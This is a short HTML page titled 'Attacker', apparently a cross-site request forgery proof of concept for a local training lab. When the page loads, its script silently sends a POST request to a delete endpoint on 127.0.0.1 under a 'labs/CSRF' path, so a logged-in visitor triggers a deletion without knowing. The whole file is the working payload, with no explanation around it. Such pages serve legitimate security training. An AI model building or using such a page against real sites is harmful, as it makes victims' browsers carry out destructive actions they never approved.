<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <title>Attacker</title>
</head>
<body>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
  <script>
    $.ajax(
      {
        'url':'http://127.0.0.1/dashboard/labs/CSRF/delete.php',
        'type': 'POST'
      }
    );
  </script>
</body>
</html>
